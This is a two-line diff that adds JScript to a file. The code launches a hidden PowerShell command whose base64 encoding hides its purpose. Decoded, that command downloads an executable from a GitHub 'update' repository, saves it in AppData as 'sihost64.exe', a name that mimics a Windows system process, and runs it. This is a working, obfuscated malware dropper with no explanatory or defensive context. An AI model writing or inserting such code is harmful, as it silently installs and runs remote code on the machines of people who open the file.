@@ -1,0 +1,2 @@
+c="powershell.exe -enc KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCYjMzk7aHR0cHM6Ly9naXRodWIuY29tL0Ryb3BtYW4vdXBkYXRlL3Jhdy9tYXN0ZXIvYS5leGUmIzM5OywkZW52OmFwcGRhdGErJiMzOTtcc2lob3N0NjQuZXhlJiMzOTspOyRhPSRlbnY6YXBwZGF0YSsmIzM5O1xzaWhvc3Q2NC5leGUmIzM5OztzdGFydCAkYQ=="; 
+new ActiveXObject("WScript.Shell").Run(c,0,true); 
